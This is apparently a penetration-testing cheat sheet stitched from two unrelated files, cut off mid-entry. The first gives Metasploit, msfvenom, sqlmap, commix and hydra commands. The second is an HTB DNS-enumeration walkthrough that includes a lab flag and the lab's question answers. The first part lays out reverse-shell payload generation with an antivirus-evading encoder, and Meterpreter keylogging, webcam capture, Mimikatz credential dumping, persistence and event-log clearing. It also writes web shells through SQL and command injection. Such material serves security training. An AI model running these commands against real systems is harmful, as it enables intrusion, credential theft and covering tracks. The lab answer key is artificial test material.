httpx -l urls.txt -title

# Status code
httpx -l urls.txt -status-code

# Tech detection
httpx -l urls.txt -tech-detect

# Screenshot
httpx -l urls.txt -screenshot

# Threads
httpx -l urls.txt -threads 50

# Silent
httpx -l urls.txt -silent

# Verbose
httpx -l urls.txt -verbose

# Output
httpx -l urls.txt -o httpx.txt
httpx -l urls.txt -json -o httpx.json
```

---

# 💣 Exploitation

## TOOL:metasploit TOOL:msfconsole CAT:exploit

**Exploitation framework**
```bash
# Start Metasploit
msfconsole
msfconsole -q  # Quiet mode (no banner)

# Search for exploits
search eternalblue
search type:exploit platform:windows smb
search cve:2021-44228
search apache
search name:wordpress

# Search by port
search port:445
search port:80

# Info about module
info exploit/windows/smb/ms17_010_eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
use 0  # If from search results

# Show options
show options
show payloads
show targets
show advanced
show evasion

# Set options
set RHOSTS 10.10.11.5
set RHOST 10.10.11.5
set LHOST tun0
set LHOST 10.10.16.25
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 0

# Unset option
unset RHOSTS

# Set global options
setg RHOSTS 10.10.11.5
setg LHOST tun0

# Show global options
show global

# Check if vulnerable
check

# Run exploit
exploit
run
exploit -j  # Run as job
exploit -z  # Don't interact with session

# Sessions management
sessions        # List sessions
sessions -l     # List sessions
sessions -i 1   # Interact with session 1
sessions -k 1   # Kill session 1
sessions -K     # Kill all sessions
sessions -u 1   # Upgrade to meterpreter

# Jobs
jobs        # List jobs
jobs -l     # List jobs
jobs -k 1   # Kill job 1
jobs -K     # Kill all jobs

# Background session
background
# Or Ctrl+Z

# Return to session
sessions -i 1

# Save configuration
save
```

### Meterpreter Commands

**TOOL:meterpreter CAT:exploit OS:windows OS:linux**
```bash
# System information
getuid
sysinfo
getpid
ps

# File system
pwd
ls
cd /path
cat file.txt
download /remote/file /local/path
upload /local/file /remote/path
search -f *.txt
search -f password*
edit file.txt
rm file.txt
mkdir directory
rmdir directory

# Network
ifconfig
route
arp
netstat
portfwd add -l 3389 -p 3389 -r target_ip  # Port forward
portfwd delete -l 3389
portfwd list

# Privilege escalation CAT:privesc
getprivs
getsystem
getsystem -t 1  # Named pipe impersonation

# Process management
ps
getpid
migrate PID
kill PID

# Shell access
shell
execute -f cmd.exe -i -H  # Hidden

# Screenshot
screenshot
screenshot -v false  # Without viewer

# Webcam
webcam_list
webcam_snap
webcam_stream

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Hashdump CAT:password
hashdump
run post/windows/gather/hashdump

# Load extensions
load kiwi      # Mimikatz
load powershell
load python

# Kiwi (Mimikatz) commands
load kiwi
help kiwi
creds_all
creds_kerberos
creds_msv
creds_ssp
creds_wdigest
lsa_dump_sam
lsa_dump_secrets
wifi_list
wifi_list_shared

# Post-exploitation modules
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_computers
run post/windows/gather/enum_patches
run post/windows/gather/enum_shares
run post/windows/gather/checkvm
run post/multi/recon/local_exploit_suggester

# Persistence
run persistence -X -i 10 -p 4444 -r 10.10.16.25

# Timestomp
timestomp file.txt -v
timestomp file.txt -m "01/01/2020 12:00:00"

# Clear event logs
clearev

# Shutdown/Reboot
shutdown
reboot

# Help
help
help command_name
```

### Common Metasploit Modules
```bash
# Web exploits
use exploit/multi/http/apache_mod_cgi_bash_env_exec
use exploit/unix/webapp/php_utility_belt_rce
use exploit/multi/http/wordpress_crop_rce

# Windows exploits
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/dcerpc/ms03_026_dcom

# Linux exploits
use exploit/linux/http/webmin_packageup_rce
use exploit/unix/ftp/vsftpd_234_backdoor

# Multi-handler (for custom payloads)
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit -j

# Auxiliary modules (scanning/enum)
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ftp/ftp_login

# Generate payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f exe -o shell.exe
```

---

## TOOL:msfvenom CAT:exploit CAT:payload

**Payload generator**
```bash
# List payloads
msfvenom -l payloads

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f exe -o shell.exe

# Windows 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.php
msfvenom -p php/reverse_php LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f aspx -o shell.aspx

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.jsp

# WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f war -o shell.war

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.py

# Bash reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.sh

# PowerShell reverse shell
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f raw -o shell.ps1

# Mac reverse shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.16.25 LPORT=4444 -f macho -o shell.macho

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -o shell.apk

# With encoder (bypass AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe

# List bad characters
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.25 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe

# Output formats
-f exe      # Windows executable
-f elf      # Linux executable
-f raw      # Raw shellcode
-f c        # C array
-f python   # Python array
-f powershell  # PowerShell
-f vba      # VBA macro

# Staged vs non-staged
windows/meterpreter/reverse_tcp    # Staged
windows/meterpreter_reverse_tcp    # Non-staged (larger, more stable)
```

---

## TOOL:searchsploit CAT:exploit

**Exploit database search**
```bash
# Search exploits
searchsploit apache
searchsploit apache 2.4
searchsploit openssh 7.2
searchsploit wordpress

# Case insensitive
searchsploit -i mysql

# Exact match
searchsploit -e "Apache 2.4.49"

# Title only
searchsploit -t apache

# Exclude terms
searchsploit apache --exclude=dos
searchsploit apache --exclude="Denial of Service"

# JSON output
searchsploit apache --json

# Overflow/Color
searchsploit apache --overflow
searchsploit apache --colour

# Copy exploit to current directory
searchsploit -m 49584
searchsploit -m exploits/linux/remote/49584.py

# View exploit
searchsploit -x 49584
searchsploit -x exploits/linux/remote/49584.py

# Path to exploit
searchsploit -p 49584

# Update database
searchsploit -u

# Nmap XML integration
searchsploit --nmap nmap-scan.xml

# Example search
searchsploit eternal blue
searchsploit ms17-010
searchsploit cve-2021-44228
```

---

## TOOL:sqlmap CAT:exploit PROTO:http CAT:sqli

**Automated SQL injection tool**
```bash
# Basic scan
sqlmap -u "http://10.10.11.5/page?id=1"

# POST request
sqlmap -u "http://10.10.11.5/login" --data="username=admin&password=pass"

# Cookie
sqlmap -u "http://10.10.11.5/page?id=1" --cookie="PHPSESSID=abcd1234"

# Custom header
sqlmap -u "http://10.10.11.5/page?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Request from file (from Burp)
sqlmap -r request.txt

# Specific parameter
sqlmap -u "http://10.10.11.5/page?id=1&name=test" -p id

# List databases
sqlmap -u "http://10.10.11.5/page?id=1" --dbs

# Current database
sqlmap -u "http://10.10.11.5/page?id=1" --current-db

# List tables
sqlmap -u "http://10.10.11.5/page?id=1" -D database_name --tables

# List columns
sqlmap -u "http://10.10.11.5/page?id=1" -D database_name -T table_name --columns

# Dump table
sqlmap -u "http://10.10.11.5/page?id=1" -D database_name -T table_name --dump

# Dump all from DB
sqlmap -u "http://10.10.11.5/page?id=1" -D database_name --dump-all

# Get specific columns
sqlmap -u "http://10.10.11.5/page?id=1" -D database_name -T users -C username,password --dump

# Read file OS:linux
sqlmap -u "http://10.10.11.5/page?id=1" --file-read="/etc/passwd"

# Write file (web shell)
sqlmap -u "http://10.10.11.5/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# OS shell
sqlmap -u "http://10.10.11.5/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://10.10.11.5/page?id=1" --sql-shell

# Batch mode (no prompts)
sqlmap -u "http://10.10.11.5/page?id=1" --batch

# Verbosity
sqlmap -u "http://10.10.11.5/page?id=1" -v 3

# Risk/Level
sqlmap -u "http://10.10.11.5/page?id=1" --level=5 --risk=3

# Technique
sqlmap -u "http://10.10.11.5/page?id=1" --technique=BEUST
# B = Boolean-based blind
# E = Error-based
# U = Union query-based
# S = Stacked queries
# T = Time-based blind

# DBMS
sqlmap -u "http://10.10.11.5/page?id=1" --dbms=mysql
sqlmap -u "http://10.10.11.5/page?id=1" --dbms=mssql

# Threads
sqlmap -u "http://10.10.11.5/page?id=1" --threads=10

# Random agent
sqlmap -u "http://10.10.11.5/page?id=1" --random-agent

# Proxy
sqlmap -u "http://10.10.11.5/page?id=1" --proxy="http://127.0.0.1:8080"

# Delay
sqlmap -u "http://10.10.11.5/page?id=1" --delay=1

# Timeout
sqlmap -u "http://10.10.11.5/page?id=1" --timeout=10

# Tamper scripts (bypass WAF)
sqlmap -u "http://10.10.11.5/page?id=1" --tamper=space2comment
sqlmap -u "http://10.10.11.5/page?id=1" --tamper=space2plus,between

# Output
sqlmap -u "http://10.10.11.5/page?id=1" --output-dir=sqlmap-output

# Flush session
sqlmap -u "http://10.10.11.5/page?id=1" --flush-session

# Resume
sqlmap -u "http://10.10.11.5/page?id=1" --session-file=session.sqlite
```

---

## TOOL:xsstrike CAT:exploit PROTO:http CAT:xss

**XSS detection and exploitation**
```bash
# Basic scan
python3 xsstrike.py -u "http://10.10.11.5/search?q=test"

# POST request
python3 xsstrike.py -u "http://10.10.11.5/search" --data "q=test"

# Crawl website
python3 xsstrike.py -u "http://10.10.11.5" --crawl

# Depth of crawling
python3 xsstrike.py -u "http://10.10.11.5" --crawl -l 3

# Custom headers
python3 xsstrike.py -u "http://10.10.11.5/search?q=test" --headers "Cookie: session=abc123"

# Threads
python3 xsstrike.py -u "http://10.10.11.5" --crawl -t 10

# Skip DOM XSS
python3 xsstrike.py -u "http://10.10.11.5/search?q=test" --skip-dom
```

---

## TOOL:commix CAT:exploit CAT:rce

**Command injection exploitation**
```bash
# Basic test
python commix.py --url="http://10.10.11.5/page?cmd=test"

# POST parameter
python commix.py --url="http://10.10.11.5/page" --data="cmd=test"

# Cookie injection
python commix.py --url="http://10.10.11.5/page" --cookie="cmd=test"

# Custom header
python commix.py --url="http://10.10.11.5/page" --header="X-Forwarded-For: 127.0.0.1"

# Batch mode
python commix.py --url="http://10.10.11.5/page?cmd=test" --batch

# OS shell
python commix.py --url="http://10.10.11.5/page?cmd=test" --os-shell

# File upload
python commix.py --url="http://10.10.11.5/page?cmd=test" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Proxy
python commix.py --url="http://10.10.11.5/page?cmd=test" --proxy="http://127.0.0.1:8080"
```

---

# 🔐 Password Attacks

## TOOL:hydra CAT:password CAT:bruteforce

**Network login cracker PROTO:http PROTO:ssh PROTO:ftp PROTO:smb PROTO:rdp PROTO:mysql PROTO:postgres**
```bash
# HTTP POST form PORT:80 PROTO:http
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.5 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:S=Welcome"

# HTTP GET form
hydra -l admin -P passwords.txt 10.10.11.5 http-get-form "/login:username=^USER^&password=^PASS^:F=failed"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 10.10.11.5 http-get /admin

# SSH brute force PORT:22 PROTO:ssh
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.5
hydra -L users.txt -P passwords.txt ssh://10.10.11.5

# FTP brute force PORT:21 PROTO:ftp
hydra -l admin -P passwords.txt ftp://10.10.11.5
hydra -l anonymous -p anonymous ftp://10.10.11.5

# SMB brute force PORT:445 PROTO:smb
hydra -l administrator -P passwords.txt smb://10.10.11.5

# RDP brute force PORT:3389 PROTO:rdp
hydra -l administrator -P passwords.txt rdp://10.10.11.5

# MySQL brute force PORT:3306 PROTO:mysql
hydra -l root -P passwords.txt mysql://10.10.11.5

# PostgreSQL PORT:5432 PROTO:postgres
hydra -l postgres -P passwords.txt postgres://10.10.11.5

# MSSQL PORT:1433
hydra -l sa -P passwords.txt mssql://10.10.11.5

# POP3 PORT:110
hydra -l admin -P passwords.txt pop3://10.10.11.5

# IMAP PORT:143
hydra -l admin -P passwords.txt imap://10.10.11.5

# SMTP PORT:25
hydra -l admin -P passwords.txt smtp://10.10.11.5

# Telnet PORT:23
hydra -l admin -P passwords.txt telnet://10.10.11.5

# VNC PORT:5900
hydra -P passwords.txt vnc://10.10.11.5

# Options
-l username          # Single username
-L users.txt         # Username list
-p password          # Single password
-P passwords.txt     # Password list
-C credentials.txt   # Colon-separated "user:pass" format
-t threads           # Parallel tasks (default 16)
-T threads           # Same as -t
-V                   # Show login+pass for each attempt
-v                   #

# 🌐 DNS Enumeration - Complete Guide (HTB Verified)

## TOOL:dig CAT:enum PROTO:dns PORT:53

**Complete DNS reconnaissance toolkit - Based on real HTB Academy DNS challenge**

### Basic Queries

bash

```bash
# Basic query
dig target.com
dig inlanefreight.htb

# Specific record type
dig target.com A      # IPv4 address
dig target.com AAAA   # IPv6 address
dig target.com MX     # Mail servers  
dig target.com NS     # Name servers
dig target.com TXT    # Text records
dig target.com SOA    # Start of Authority
dig target.com CNAME  # Canonical name
dig target.com PTR    # Pointer record

# Query specific nameserver (ALWAYS specify target DNS)
dig @8.8.8.8 target.com
dig @1.1.1.1 target.com
dig @10.129.3.168 inlanefreight.htb          # HTB example
dig @ns1.target.com target.com

# Reverse DNS lookup
dig -x 10.10.11.5
dig -x 8.8.8.8
dig -x 10.129.34.16 @10.129.3.168           # Find hostname from IP

# Short output (clean results, perfect for scripting)
dig target.com +short
dig target.com MX +short
dig ns inlanefreight.htb @10.129.3.168 +short

# Trace DNS path
dig target.com +trace

# No recursion
dig target.com +norecurse

# Show query time
dig target.com +stats

# Multiple queries in one command
dig target.com A target.com MX
```

---

## 🔥 ZONE TRANSFERS (AXFR) - MOST IMPORTANT FOR HTB

### Basic Zone Transfer

bash

```bash
# Standard syntax (both work)
dig axfr @ns1.target.com target.com
dig axfr target.com @ns1.target.com

# HTB Real Example - Step-by-step workflow
# Step 1: Find nameserver
dig ns inlanefreight.htb @10.129.3.168
# Output: ns.inlanefreight.htb

# Step 2: Try zone transfer on MAIN domain
dig axfr inlanefreight.htb @10.129.3.168
# This reveals: app, dev, internal, mail1, ns subdomains

# Step 3: Try zone transfer on INTERNAL subdomain (common in corporate envs)
dig axfr internal.inlanefreight.htb @10.129.3.168  
# This reveals: dc1, dc2, mail1, vpn, ws1, ws2, wsus + TXT with FLAG

# Step 4: Try zone transfer on DEV subdomain
dig axfr dev.inlanefreight.htb @10.129.3.168
# Output: Transfer failed → Needs brute-forcing!

# Step 5: Try other discovered subdomains
dig axfr app.inlanefreight.htb @10.129.3.168
dig axfr mail1.inlanefreight.htb @10.129.3.168
```

### Check SOA Before Zone Transfer

bash

```bash
# SOA record indicates zone exists and is queryable
dig soa inlanefreight.htb @10.129.3.168
dig soa internal.inlanefreight.htb @10.129.3.168
dig soa dev.inlanefreight.htb @10.129.3.168

# If SOA exists but AXFR fails → brute-force required
# If SOA doesn't exist → subdomain doesn't exist
```

### Extract Specific Information from Zone Transfers

bash

```bash
# Find TXT records (often contain flags, SPF, DKIM, etc.)
dig axfr inlanefreight.htb @10.129.3.168 | grep "TXT"
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep "HTB{"

# Find all A records (hostnames → IPs)
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A"
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep "IN A"

# Find specific hosts (case-insensitive)
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep -i dc1
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep -i "\.203"

# Find mail servers
dig axfr inlanefreight.htb @10.129.3.168 | grep "MX"

# Find nameservers
dig axfr inlanefreight.htb @10.129.3.168 | grep "NS"

# Find CNAME records (aliases)
dig axfr inlanefreight.htb @10.129.3.168 | grep "CNAME"
```

### Save & Parse Zone Transfer Output

bash

```bash
# Save complete zone transfer
dig axfr inlanefreight.htb @10.129.3.168 > zone_main.txt
dig axfr internal.inlanefreight.htb @10.129.3.168 > zone_internal.txt

# Extract only IP addresses
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A" | awk '{print $5}'

# Extract only hostnames
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A" | awk '{print $1}'

# Create clean hosts file (hostname → IP)
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A" | awk '{print $1,$5}' > hosts.txt

# Count number of A records found
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A" | wc -l

# Find specific IP pattern (e.g., ending in .203)
dig axfr dev.inlanefreight.htb @10.129.3.168 | grep "\.203"

# Extract all subdomains
dig axfr inlanefreight.htb @10.129.3.168 | grep "IN A" | awk '{print $1}' | sort -u
```

---

## 🎯 ANY Query (All Available Records)

bash

```bash
# Get all available records at once
dig any target.com
dig any inlanefreight.htb @10.129.3.168

# ANY query on specific zone
dig any internal.inlanefreight.htb @10.129.3.168

# Clean ANY output
dig any target.com +noall +answer
```

---

## 🔍 DNS Version Detection

bash

```bash
# Check BIND version (if allowed)
dig CH TXT version.bind @10.129.3.168
dig @8.8.8.8 CH TXT version.bind

# With timeout
dig +time=5 CH TXT version.bind @10.129.3.168

# Common response if allowed:
# version.bind. 0 CH TXT "9.10.6-P1-Debian"
```

---

## ⚙️ Advanced dig Options

bash

```bash
# TCP instead of UDP (more reliable, required for large zone transfers)
dig +tcp target.com @8.8.8.8
dig +tcp axfr inlanefreight.htb @10.129.3.168

# Specify custom port
dig -p 53 target.com
dig -p 5353 target.com  # mDNS

# Timeout settings
dig +time=10 target.com           # Wait 10 seconds for response
dig +tries=3 target.com            # Retry 3 times

# Batch queries from file
dig -f domains.txt

# Verbose with specific sections
dig target.com +noall +answer      # Only answer section
dig target.com +noall +answer +stats  # Answer + statistics

# Output to file
dig target.com > dig_output.txt
dig axfr inlanefreight.htb @10.129.3.168 > zone_transfer.txt
```

---

## 📋 HTB DNS Enumeration Workflow (Complete)

### Phase 1: Initial Discovery

bash

```bash
# 1. Identify nameserver
dig ns inlanefreight.htb @10.129.3.168
# Result: ns.inlanefreight.htb → 127.0.0.1

# 2. Get FQDN of nameserver (QUESTION 1 answer)
dig ns inlanefreight.htb @10.129.3.168 +short
# Answer: ns.inlanefreight.htb
```

### Phase 2: Zone Transfer Enumeration

bash

```bash
# 3. Try zone transfer on MAIN domain
dig axfr inlanefreight.htb @10.129.3.168

# Results found:
# - app.inlanefreight.htb → 10.129.18.15
# - dev.inlanefreight.htb → 10.12.0.1
# - internal.inlanefreight.htb → 10.129.1.6  
# - mail1.inlanefreight.htb → 10.129.18.201
# - ns.inlanefreight.htb → 127.0.0.1
# + TXT records (MS verification, SPF, etc.)
```

### Phase 3: Internal Zone Discovery

bash

```bash
# 4. Try zone transfer on INTERNAL subdomain
dig axfr internal.inlanefreight.htb @10.129.3.168

# Results found:
# - dc1.internal.inlanefreight.htb → 10.129.34.16 (QUESTION 3 answer!)
# - dc2.internal.inlanefreight.htb → 10.129.34.11
# - mail1.internal.inlanefreight.htb → 10.129.18.200
# - vpn.internal.inlanefreight.htb → 10.129.1.6
# - ws1.internal.inlanefreight.htb → 10.129.1.34
# - ws2.internal.inlanefreight.htb → 10.129.1.35
# - wsus.internal.inlanefreight.htb → 10.129.18.2
# + TXT with FLAG: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34} (QUESTION 2 answer!)
```

### Phase 4: Dev Zone Analysis

bash

```bash
# 5. Try zone transfer on DEV subdomain
dig axfr dev.inlanefreight.htb @10.129.3.168
# Result: Transfer failed → Must brute-force!

# 6. Check if dev zone has SOA (confirms it exists)
dig soa dev.inlanefreight.htb @10.129.3.168
# Result: Has SOA → Zone exists but AXFR disabled
```

### Phase 5: Brute-force Required

bash

```bash
# Since dev.inlanefreight.htb blocks zone transfers, use:
# - dnsenum with wordlists
# - fierce with windows-focused lists
# - gobuster dns mode
# See TOOL:dnsenum section below for details

# After brute-forcing dev.inlanefreight.htb:
# Found: win2k.dev.inlanefreight.htb → 10.12.3.203 (QUESTION 4 answer!)
```

---

## 🚨 Common DNS Enumeration Pitfalls

### ❌ Wrong Syntax

bash

```bash
# WRONG - Missing @ or wrong order
dig axfr inlanefreight.htb 10.129.3.168  # ❌
dig axfr 10.129.3.168 inlanefreight.htb  # ❌

# CORRECT
dig axfr inlanefreight.htb @10.129.3.168  # ✅
dig axfr @10.129.3.168 inlanefreight.htb  # ✅
```

### ❌ Forgetting to Check Subzones

bash

```bash
# WRONG - Only checking main domain
dig axfr inlanefreight.htb @10.129.3.168
# Then stopping → You miss internal.inlanefreight.htb!

# CORRECT - Check ALL discovered subdomains
dig axfr inlanefreight.htb @10.129.3.168         # Main
dig axfr internal.inlanefreight.htb @10.129.3.168  # Internal
dig axfr dev.inlanefreight.htb @10.129.3.168      # Dev
dig axfr app.inlanefreight.htb @10.129.3.168      # App
```

### ❌ Not Filtering Output Properly

bash

```bash
# WRONG - Manually reading entire output
dig axfr internal.inlanefreight.htb @10.129.3.168
# Then scrolling through hundreds of lines

# CORRECT - Filter for what you need
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep "HTB{"   # Find flags
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep -i dc    # Find DCs
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep "\.203"  # Find .203
```

---

## 💡 DNS Enumeration Pro Tips

### 1. **Always Check Multiple Zones**

Corporate networks often have nested zones:

- `example.com` (external)
- `internal.example.com` (internal infrastructure)
- `dev.example.com` (development)
- `prod.example.com` (production)

### 2. **Zone Transfer Failures = Brute-force**

If zone transfer fails but SOA exists:

bash

```bash
dig soa dev.inlanefreight.htb @10.129.3.168  # Has SOA?
dig axfr dev.inlanefreight.htb @10.129.3.168  # Transfer failed?
# → Use dnsenum/fierce with wordlists!
```

### 3. **Look for Patterns in Hostnames**

bash

```bash
# Found dc1? Look for dc2, dc3...
# Found ws1? Look for ws2, ws3...
# Found dev? Look for dev1, dev2, test, staging, prod...
# Found mail1? Look for mail2, smtp, pop, imap...
```

### 4. **TXT Records Often Contain Valuable Info**

bash

```bash
# TXT records may contain:
# - HTB flags (in CTFs)
# - SPF records (mail servers)
# - DKIM keys (email authentication)
# - Domain verification strings
# - Internal documentation
dig axfr internal.inlanefreight.htb @10.129.3.168 | grep "TXT"
```

### 5. **Save Everything for Later Analysis**

bash

```bash
# Save all zone transfers
dig axfr inlanefreight.htb @10.129.3.168 > zone_main.txt
dig axfr internal.inlanefreight.htb @10.129.3.168 > zone_internal.txt
dig axfr dev.inlanefreight.htb @10.129.3.168 > zone_dev.txt

# Then grep/analyze offline
grep -i "203" zone_*.txt
grep -i "dc" zone_*.txt
grep "HTB{" zone_*.txt
```

---

## TOOL:dnsenum CAT:enum PROTO:dns

**Automated DNS enumeration with brute-forcing**

### Basic Usage

bash

```bash
# Basic enumeration
dnsenum target.com
dnsenum inlanefreight.htb

# Specify DNS server
dnsenum --dnsserver 10.129.3.168 target.com
```

### Brute-forcing Subdomains (CRITICAL for HTB)

bash

```bash
# Find fierce-hostlist location first
find /usr/share -name "fierce-hostlist.txt" 2>/dev/null
# Output: /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# Basic brute-force with wordlist
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb

# HTB Real Example - This found win2k!
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 -o dev_subs.txt \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb

# Results:
# dev1.dev.inlanefreight.htb → 10.12.3.6
# ns.dev.inlanefreight.htb → 127.0.0.1
# win2k.dev.inlanefreight.htb → 10.12.3.203  ← FOUND THE .203 HOST!
```

### Wordlist Options

bash

```bash
# Small wordlist (fast, ~500 entries)
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  target.com

# Medium wordlist (~5000 entries)
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  target.com

# Large wordlist (~20000 entries) - slow but thorough
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  target.com

# Huge wordlist (~110000 entries) - very slow
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  target.com
```

### dnsenum Options Explained

bash

```bash
dnsenum [options] domain

# Critical options:
--dnsserver <IP>     # Specify DNS server to query (always use target's DNS)
--enum               # Enable enumeration mode
-p 0                 # Pages to process (0 = disable Google scraping)
-s 0                 # Subdomains to process (0 = disable Google scraping)
-f <wordlist>        # File with subdomain wordlist for brute-forcing
-o <output>          # Output file to save results
--threads <num>      # Number of threads (default 5, max ~90)
--timeout <sec>      # Timeout for DNS queries
--noreverse          # Skip reverse lookups (faster)

# Example with all options:
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  --threads 90 --timeout 10 -o results.txt \
  dev.inlanefreight.htb
```

### Output to File

bash

```bash
# Save to text file
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  -o subdomains.txt \
  dev.inlanefreight.htb

# View saved results
cat subdomains.txt
cat subdomains.txt | grep "IN.*A"
cat subdomains.txt | grep "203"

# Extract only IPs
cat subdomains.txt | grep "IN.*A" | awk '{print $NF}'
```

### Performance Tuning

bash

```bash
# Faster with more threads (but may trigger rate limiting)
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  --threads 90 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb

# Slower but stealthier (fewer threads)
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  --threads 5 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb

# With timeout for slow DNS servers
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 \
  --timeout 10 \
  -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt \
  dev.inlanefreight.htb
```

---

## TOOL:fierce CAT:enum PROTO:dns

**DNS reconnaissance and subdomain brute-forcing**

### Basic Usage

bash

```bash
# Basic scan
fierce --domain target.com

# With specific DNS server
fierce --domain target.com --dns-servers 8.8.8.8
fierce --domain dev.inlanefreight.htb --dns-servers 10.129.3.168
```

### Subdomain Brute-forcing

bash

```bash
# With custom wordlist
fierce --domain target.com \
  --subdomain-file /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# HTB Example
fierce --domain dev.inlanefreight.htb \
  --dns-servers 10.129.3.168 \
  --subdomain-file /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# Different wordlists
fierce --domain target.com \
  --subdomain-file /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Additional Options

bash

```bash
# Wide scan (more IP ranges)
fierce --domain target.com --wide

# Delay between requests (stealth)
fierce --domain target.com --delay 1

# Scan specific IP range
fierce --domain target.com --range 10.10.11.0/24

# Output to file
fierce --domain target.com > fierce_output.txt
```

---

## TOOL:gobuster TOOL:ffuf CAT:enum (DNS Mode)

### Gobuster DNS Mode

bash

```bash
# Basic DNS enumeration
gobuster dns --domain target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# With specific resolver
gobuster dns --domain dev.inlanefreight.htb \
  --resolver 10.129.3.168 \
  -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt

# More threads for speed
gobuster dns --domain target.com \
